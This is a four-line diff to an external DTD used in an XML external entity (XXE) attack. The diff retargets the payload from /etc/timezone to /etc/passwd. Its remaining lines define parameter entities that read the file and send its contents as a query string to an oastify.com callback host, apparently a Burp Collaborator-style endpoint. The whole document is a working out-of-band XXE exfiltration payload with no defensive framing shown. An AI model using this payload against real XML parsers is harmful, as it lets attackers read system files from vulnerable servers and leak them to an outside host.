@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///etc/timezone">
+<!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % wrapper "<!ENTITY &#x25; send SYSTEM 'http://5w2emgqpixazwi1xm36rbueluc03owek3.oastify.com.oastify.com/?data=%file;'>">
 %wrapper;
 %send;
